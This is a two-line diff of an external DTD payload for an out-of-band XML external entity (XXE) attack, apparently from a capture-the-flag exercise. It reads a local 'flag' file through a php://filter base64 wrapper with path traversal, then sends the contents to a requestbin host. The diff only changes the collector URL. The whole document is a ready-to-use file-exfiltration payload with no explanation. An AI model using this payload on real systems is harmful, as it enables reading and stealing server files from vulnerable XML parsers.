@@ -1,2 +1,2 @@
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=../../../../flag">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://requestbin.whapi.cloud/1g1f2kv1/?d=%data;'>">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://requestbin.whapi.cloud/1dneiqa1/?d=%data;'>">
